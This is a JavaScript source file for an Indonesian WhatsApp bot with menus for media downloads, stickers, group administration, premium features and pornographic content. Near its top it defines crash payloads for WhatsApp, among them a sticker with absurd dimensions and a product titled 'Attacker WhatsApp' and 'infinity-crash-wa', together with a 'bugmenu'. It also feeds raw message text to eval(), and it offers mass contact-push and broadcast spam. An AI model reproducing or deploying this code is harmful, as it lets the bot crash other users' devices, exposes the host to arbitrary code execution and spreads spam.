require('./config')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
let fetch = require('node-fetch');
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { tizi } = require('./lib/tizi');
const { weg } = require('./lib/weg');
const { vapi } = require('./lib/vapi.js');
const { philips } = require('./lib/philips.js');
const { apikey } = require('./apikey.json')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { smsg, hitungmundur, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");

const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const thumb = fs.readFileSync(`./image/lol.jpg`)


module.exports = conn = async (conn, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const { chats } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isPrem = prem.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = moment().tz("Asia/Makassar").format("dddd, ll")
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const qtod = m.quoted? "true":"false"
const vn = false
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
         if(time2 < "23:59:00"){
var shinchantime = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var shinchantime = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var shinchantime = `Selamat Sore 🌃`
 }
 if(time2 < "15:00:00"){
var shinchantime = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var shinchantime = `Siang  🌄`
 }
 if(time2 < "05:00:00"){
var shinchantime = `Selamat Pagi 🌄`
 } 
//fake quoted
const ftroli = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         "message": {
            orderMessage: {
               itemCount: 7777777,
               status: 200,
               surface: 200,
               message: `© ${ownername}`,
               orderTitle: 'memek',
               sellerJid: '0@s.whatsapp.net'
            }
         },
         contextInfo: {
            "forwardingScore": 999,
            "isForwarded": true
         },
         sendEphemeral: true
      }
const fkontak = {
         key: {
            participant: `0@s.whatsapp.net`,
            ...(from ? {
               remoteJid: `status@broadcast`
            } : {})
         },
         message: {
            'contactMessage': {
               'displayName': `${pushname}`,
               'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
               'jpegThumbnail': thumb,
               thumbnail: thumb,
               sendEphemeral: true
            }
         }
      }
      const fbugstik = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 999999999,
"width": 999999999,
"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
"fileLength": "999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}
const fbugtoko = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //Gambarnye
},
"title": `👿ᴬᵗᵗᵃᶜᵏᵉʳ ᵂʰᵃᵗˢᴬᵖᵖ👿`, //Kasih namalu 
"description": "⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ", 
"retailerId": "XD",
"productImageCount": 999999999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
const fbugtext = {
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: {
        "extendedTextMessage": {
        "text": `${weg}\n${weg}`
        }
        }
        }
        const fbugcall = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
        "scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `test`,
}
}
}
const ftest = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"interactiveMessage": {
						"header": {
							"title": "ShinChan",
							"subtitle": "Jumlah 1"
						},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": { 
									"currency": "IDR",
									"external_payment_configurations":[
									{
									"uri": "",
									"type": "payment_instruction",
									"payment_instruction": "Anu"
									}
									],
									"payment_configuration":"",
									"payment_type":"",
									"total_amount": 10000,
									"reference_id":"4N003CFPZ6N",
									"type":"physical-goods",
									"payment_status":"captured",
									"payment_timestamp": 1696052026,
									"order":{"status":"completed","description":"","subtotal": 10000,
									"items":[
									{
									"retailer_id": "custom-item-ef3e2769-f40f-410f-9da4-5b3478de1bc4",
									"name":"ShinChan",
									"amount": 10000,
									"quantity":1}]}}
								}
							]
						}
					}
					}
					}
//===================SHINCHAN XD=========================//
if (vn) {
let allct = await store.chats.all().map(v => v.id)
if (m.message && m) {
if (vn === false) return
for (let jid of allct) {
conn.sendPresenceUpdate('composing', jid)
}
}
}
//===================SHINCHAN XD=========================//
const paycall = (teks) => {
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": 'call',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${teks}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(m.chat, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
const paytod = (teks) => {
let me = m.sender
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "10000000000",
"requestFrom": `@${me.split('@')[0]}`,
"noteMessage": {
"extendedTextMessage": {
"text": `${teks}`,
}
}}}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
const reply = (teks) => {
return conn.sendMessage(from, { text: teks, 
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `DEVELOPER ${global.ownername}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: fkontak})} 

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
// DELAY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function loading () {
var shinchanehe = [
"▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 10%",
"████▓▓▓▓▓▓▓▓▓▓ 30%",
"████████▓▓▓▓▓▓ 50%",
"████████████▓▓ 80%",
"██████████████ 100%",
"Loading Completed!"
]
let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu

for (let i = 0; i < shinchanehe.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
}
}

//auto off
if (global.autoOff) {
if (command) {
conn.sendPresenceUpdate('unavailable', from)
}
}
//auto typing
if (global.autoTyping) {
if (command) {
conn.sendPresenceUpdate('composing', from)
}
}
//auto recording
if (global.autoRecord) {
if (command) {
conn.sendPresenceUpdate('recording', from)
}
}
//auto reading
if (global.autoReading) {
if (command) {
conn.readMessages([m.key])
}
}
// Public & Self
      if (!conn.self) {
         if (!m.key.fromMe && !isCreator) return
      }
/*let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}*/
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

//HD FUNCTION
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	});
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

var createSerial = (size) => {removebg
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) {
case 'menu': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *FITUR FREE MENU* 
━━━━━━━━━━━━━━━
➤ ai/openai [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ loli [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ waifu [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ remini [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ pixivdl [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ smeme [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ spotify [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ spotifysearch [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ qc [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ aksarajawa [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ latin (translate aksara jawa) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ lens / googlelens [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ tiktok (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ tiktokmp3 (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ sticker [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ toimg [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ take/wm [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ toaudio [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ tomp3 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ togif [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
➤ tovn [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
━━━━━━━━━━━━━━━━━━━
➤ premmenu
➤ nsfwmenu
➤ grupmenu
➤ bugmenu
➤ tqto
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'premmenu': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━
  *FITUR PREMIUM MENU* 
━━━━━━━━━━━━━━━
➤ hd [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ removebg [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ imgeditor [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ textimg [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ toanime/jadianime [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ tocartoon [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ jojo [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ anime2d [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ cartoon3d [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ pretty [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ romancecomic [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ maid [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ superhero [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ watercolor [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ doodle [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ americacomic [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ starrygirl [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'nsfwmenu': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *NSFW MENU* 
━━━━━━━━━━━━━━━
➤ hentai [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ hneko [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ trap [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ blowjob [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ pussy [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ ecchi [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
➤ solog [ 🅟 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'grupmenu': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *GROUP MENU* 
━━━━━━━━━━━━━━━
➤ welcome on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilink on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushkontak (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushcontid (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bcgc (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ hidetag (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ kick (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ add (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendlinkgc (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editgroup close / open [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editinfo on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ join (linknya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editsubjek (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editdesk (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tagall (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ linkgroup [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetlinkgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ repeat [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'bugmenu': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
×_×
Fitur hanya boleh di akses owner ${global.ownername}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━━━
  *ONLY PRIVATE CHAT* 
━━━━━━━━━━━━━━━━━━━━━━
